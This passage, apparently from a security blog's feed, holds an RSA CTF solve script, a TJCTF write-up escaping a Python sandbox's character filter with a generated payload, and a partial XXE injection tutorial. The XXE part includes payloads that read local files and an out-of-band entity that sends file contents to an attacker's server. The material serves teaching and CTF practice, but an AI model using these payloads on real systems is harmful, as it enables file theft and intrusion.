class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line">y = gmpy2.iroot( n // <span class="number">54</span>,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"near:"</span>,y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">  k=y+i</span><br><span class="line">  <span class="keyword">if</span> gmpy2.is_prime(k):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy2.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'Found: offset=%d y=%d'</span>%(i,k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">x ,y= <span class="number">2</span>*k,k</span><br><span class="line">p = gmpy2.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy2.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br><span class="line"><span class="comment"># near: 12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953</span></span><br><span class="line"><span class="comment"># Found: offset=0 y=12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953</span></span><br><span class="line"><span class="comment"># flag = flag&#123;e01c9eb8078ea9bbac035ea68021c070&#125;</span></span><br></pre></td></tr></table></figure><p>队友Mads推出<code>x=2y</code> 了，可惜没进一步试下。他在博客写了 <a href="https://madsome.one/2018/09/03/%E8%83%96%E5%93%88%E5%8B%83%E4%B8%80%E9%81%93RSA/" target="_blank" rel="noopener">推理过程</a> ，可能不太严谨，但巧妙假设变量关系来消元的思路值得学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Problem&quot;&gt;&lt;a href=&quot;#Problem&quot; class=&quot;headerlink&quot; title=&quot;Problem&quot;&gt;&lt;/a&gt;Problem&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法</title>
    <link href="https://findneo.github.io/180814-python-jail-escape/"/>
    <id>https://findneo.github.io/180814-python-jail-escape/</id>
    <published>2018-08-14T11:24:11.000Z</published>
    <updated>2019-01-25T23:21:37.072Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1534248479004.png" alt="1534248479004"></p><p>通过nc连接<code>problem1.tjctf.org:8004</code> ,题目提供一个Python交互终端。</p><p>根据题目描述 Reflection 可知与Python反射机制有关。</p><p>所谓反射机制就是能够通过向函数传入字符串参数，来操纵指定对象的类型、属性、方法和类。</p><blockquote><p>A Python script can find out about the type, class, attributes and methods of an object. This is referred to as <strong>reflection</strong> or <strong>introspection</strong>. See also <a href="https://en.wikibooks.org/wiki/Python_Programming/Metaclasses" target="_blank" rel="noopener">Metaclasses</a>.</p><p>Reflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().</p><p>—— <a href="https://en.wikibooks.org/wiki/Python_Programming/Reflection" target="_blank" rel="noopener">https://en.wikibooks.org/wiki/Python_Programming/Reflection</a> </p></blockquote><p>这里使用<code>dir()</code> 函数查看<code>get_flag</code> 的属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">λ nc problem1.tjctf.org <span class="number">8004</span></span><br><span class="line">Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;console&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: get_flag() takes exactly <span class="number">1</span> argument (<span class="number">0</span> given)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag(<span class="string">'1'</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> <span class="keyword">not</span> a valid character</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag(<span class="string">'@'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;console&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/home/app/problem.py"</span>, line <span class="number">23</span>, <span class="keyword">in</span> get_flag</span><br><span class="line">    <span class="keyword">if</span>(eval(input) == super_secret_string):</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span></span><br><span class="line"><span class="meta">    @</span></span><br><span class="line">    ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(get_flag)</span><br><span class="line">[<span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__closure__'</span>, <span class="string">'__code__'</span>, <span class="string">'__defaults__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__get__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__globals__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__module__'</span>, <span class="string">'__name__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'func_closure'</span>, <span class="string">'func_code'</span>, <span class="string">'func_defaults'</span>, <span class="string">'func_dict'</span>, <span class="string">'func_doc'</span>, <span class="string">'func_globals'</span>, <span class="string">'func_name'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(get_flag.func_code)</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__cmp__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'co_argcount'</span>, <span class="string">'co_cellvars'</span>, <span class="string">'co_code'</span>, <span class="string">'co_consts'</span>, <span class="string">'co_filename'</span>, <span class="string">'co_firstlineno'</span>, <span class="string">'co_flags'</span>, <span class="string">'co_freevars'</span>, <span class="string">'co_lnotab'</span>, <span class="string">'co_name'</span>, <span class="string">'co_names'</span>, <span class="string">'co_nlocals'</span>, <span class="string">'co_stacksize'</span>, <span class="string">'co_varnames'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_code.co_consts</span><br><span class="line">(<span class="keyword">None</span>, <span class="string">'this_is_the_super_secret_string'</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">44</span>, <span class="number">95</span>, <span class="string">' is not a valid character'</span>, <span class="string">'%\xcb'</span>, <span class="string">"You didn't guess the value of my super_secret_string"</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>探索后猜测要求向<code>get_flag()</code> 函数传入一个字符串，eval执行后等于super_secret_string就会返回flag。</p><p><code>48, 57, 65, 90, 97, 122, 44, 95</code> 应该意味着ASCII值为 48~57，65~90，97~122，44和95的字符不被允许，也就是 <code>[a-zA-Z0-9,_]</code> 被禁用了，测试一下发现确实如此。此外 <code>&#39;%\xcb&#39;</code> 字符串也是一个提示。</p><p>这题应该是对 <a href="https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">A python’s escape from PlaidCTF jail</a> 的复现。主要目标是通过有限的字符 集 <code>({[&lt;&#39;&quot;:~%c&gt;]})</code> 构造出任意的字符串。主要思路如下：</p><ul><li><p><code>[]&lt;{}</code> 逻辑值为True，等价于1；<code>[]&lt;[]</code> 逻辑值为False，等价于0。</p></li><li><p>由1和0，结合按位取反<code>~</code> 和移位 <code>&lt;&lt;</code> 可以得到任意整数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>, <span class="string">"([]&lt;[])"</span>, <span class="string">"(&#123;&#125;&lt;[])"</span>][nb + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment"># 实际上这个函数就足够了，但生成的结果长度会比第一个长很多。</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"([]&lt;[])"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"~%s"</span> % f(~n) <span class="keyword">if</span> n % <span class="number">2</span> <span class="keyword">else</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % f(n / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> f(<span class="number">5</span>), eval(brainfuckize(<span class="number">5</span>)) == <span class="number">5</span></span><br><span class="line"><span class="comment"># ~(~(~(~([]&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[])) True</span></span><br></pre></td></tr></table></figure></li><li><p>字符串 <code>%\xcb</code> 由<code>%</code> 和 <code>\xcb)</code> 两个字符构成。<code>repr(&#39;%\xcb&#39;)</code> 会得到一个七字符的字符串，其中包含<code>%</code> 和 <code>c</code> 。结合上面的得到的整数就可以构造任意字符了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> repr(<span class="string">'%\xcb'</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> i,</span><br><span class="line">...</span><br><span class="line"><span class="string">' % \ x c b '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="string">'%\xcb'</span>`:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> i,</span><br><span class="line">...</span><br><span class="line"><span class="string">' % \ x c b '</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>`<span class="string">'%\xcb'</span>`[<span class="number">1</span>::<span class="number">3</span>]</span><br><span class="line"><span class="string">'%c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>`<span class="string">'%\xcb'</span>`[<span class="number">1</span>::<span class="number">3</span>]%<span class="number">97</span> == chr(<span class="number">97</span>)</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>在Python2 中 ，反引号包裹是 <code>repr()</code> 的快捷方式，效果完全一致。在Python3中反引号被废除了。</p></li><li><p>接下来就可以构造任意字符串并传给<code>get_flag()</code>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>, <span class="string">"([]&lt;[])"</span>, <span class="string">"(&#123;&#125;&lt;[])"</span>][nb + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % bf(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % bf(nb / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_single_char</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"`'%\\xcb'`["</span> + bf(<span class="number">1</span>) + <span class="string">"::"</span> + bf(<span class="number">3</span>) + <span class="string">"]%("</span> + bf(ord(c)) + <span class="string">")"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret = <span class="string">"this_is_the_super_secret_string"</span></span><br><span class="line">cmd = <span class="string">'get_flag("%s")'</span> % (<span class="string">'+'</span>.join(gen_single_char(i) <span class="keyword">for</span> i <span class="keyword">in</span> secret))</span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># tjctf&#123;wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="1534253889627.png" alt="1534253889627"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;1534248479004.png&quot; alt=&quot;1534248479004&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过nc连接&lt;code&gt;problem1.tjctf.org:8004&lt;/code&gt; ,题目提供一个Python交互终端。&lt;/p&gt;
&lt;p&gt;根据题目描述 Refl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XML外部实体注入小结</title>
    <link href="https://findneo.github.io/180811-xxe-injection/"/>
    <id>https://findneo.github.io/180811-xxe-injection/</id>
    <published>2018-08-11T11:18:24.000Z</published>
    <updated>2019-01-25T23:21:37.068Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文发自 <a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">先知社区</a> ，转载请注明出处。</strong> </p><p>（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）</p><h1 id="WHAT"><a href="#WHAT" class="headerlink" title="WHAT"></a>WHAT</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML是类似HTML的标记语言，但它们有所不同。</p><ul><li>其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。</li><li>其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。</li><li>此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。</li><li><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code>  称为 <code>XML prolog</code> ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</li></ul><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。</p><p>实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p>DTD有两种形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内部 DTD：&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line">外部 DTD：</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;存放元素声明的文件的URI，可以是本地文件或网络文件&quot; [可选的元素声明]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;PUBLIC_ID DTD的名称&quot; &quot;外部DTD文件的URI&quot;&gt;</span><br><span class="line">（ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）</span><br></pre></td></tr></table></figure><h2 id="ENTITY"><a href="#ENTITY" class="headerlink" title="ENTITY"></a>ENTITY</h2><p>我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">声明：</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 内部普通实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 外部普通实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 内部参数实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 外部参数实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。</span><br><span class="line">引用：</span><br><span class="line">&amp;普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用</span><br><span class="line">%参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用</span><br></pre></td></tr></table></figure><h2 id="可能造成的危害"><a href="#可能造成的危害" class="headerlink" title="可能造成的危害"></a>可能造成的危害</h2><ul><li>本地文件读取</li><li>内网访问，主机/端口扫描</li><li>网络访问</li><li>系统命令执行（特定协议，如PHP的expect）</li><li>拒绝服务（嵌套引用，指数爆炸）</li></ul><h1 id="HOW"><a href="#HOW" class="headerlink" title="HOW"></a>HOW</h1><p>URI支持的协议：</p><p><img src="1534066968195.png" alt="scheme support"></p><h2 id="利用引用外部DTD发起网络请求"><a href="#利用引用外部DTD发起网络请求" class="headerlink" title="利用引用外部DTD发起网络请求"></a>利用引用外部DTD发起网络请求</h2><p><code>test.php</code> 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在<code>192.168.1.2:80</code> 有Web服务而<code>192.168.1.3:80</code> 没有，DTD的URI不同时访问 <code>test.php</code> 就会得到不同的响应。</p><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">$dom-&gt;load(<span class="string">'with_external_dtd.xml'</span>);</span><br><span class="line"><span class="keyword">if</span> ($dom-&gt;validate()) &#123;<span class="keyword">echo</span> <span class="string">"validated!\n"</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"invalid!\n"</span>;</span><br></pre></td></tr></table></figure><p>with_external_dtd.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很快返回 validated! --&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE note SYSTEM "external_dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很快返回 invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM "http://192.168.1.2/"&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很长一段时间才返回 invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM "http://192.168.1.3/"&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>Valar Morghulis<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>external_dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="利用普通XXE读取文件-访问网络"><a href="#利用普通XXE读取文件-访问网络" class="headerlink" title="利用普通XXE读取文件/访问网络"></a>利用普通XXE读取文件/访问网络</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM "file:///C:/Windows/win.ini"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string($s);</span><br></pre></td></tr></table></figure><h2 id="利用参数XXE读取文件-访问网络"><a href="#利用参数XXE读取文件-访问网络" class="headerlink" title="利用参数XXE读取文件/访问网络"></a>利用参数XXE读取文件/访问网络</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY % b SYSTEM "http://127.0.0.1:8088/evil.txt"&gt;%b;]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;d;&lt;/c&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string($s);</span><br><span class="line"><span class="comment">// evil.txt :  &lt;!ENTITY d SYSTEM "php://filter/convert.base64-encode/resource=C:/Windows/win.ini"&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE-OOB"><a href="#XXE-OOB" class="headerlink" title="XXE OOB"></a>XXE OOB</h2><p>如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 <code>%file;</code> 必须放在外部文件里，因为根据这条 <a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset" target="_blank" rel="noopener">规则</a> ，在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： <code>PEReferences forbidden in internal subset</code> 。这里的<code>internal subset</code> 指的是中括号<code>[]</code> 内部的一系列元素声明，<code>PEReferences</code> 指的应该是参数实体引用 <code>Parameter-Entity Reference</code> 。</p><p>感觉在技术方面英文的表达力更强，这种情况叫做 <code>fetch external parsed entities using PEReference</code> 更好理解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY % xxe SYSTEM "http://127.0.0.1:8088/xxe.txt"&gt; %xxe;]&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line">simplexml_load_string($s);</span><br><span class="line"><span class="comment">/* // http://127.0.0.1:8088/xxe.txt:</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=C:/Windows/win.ini"&gt;</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % x '&lt;!ENTITY &amp;#37; send SYSTEM "http://127.0.0.1:8088/%file;"&gt;'&gt; %x;</span></span><br><span class="line"><span class="comment">%send;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h1><ul><li>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。<ul><li>WooYun-2014-73321（网易邮箱某处XXE可读取文件）</li><li>WooYun-2014-73439（QQ邮箱XXE可读取任意文件）</li><li>……</li></ul></li><li>直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 <code>simplexml_load_string</code> 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。</li><li>XML处理工具<ul><li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</li><li>WooYun-2015-134057（百度某平台Blind XXE漏洞&amp;可Bool型SSRF攻击）XML检查工具。</li><li>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) 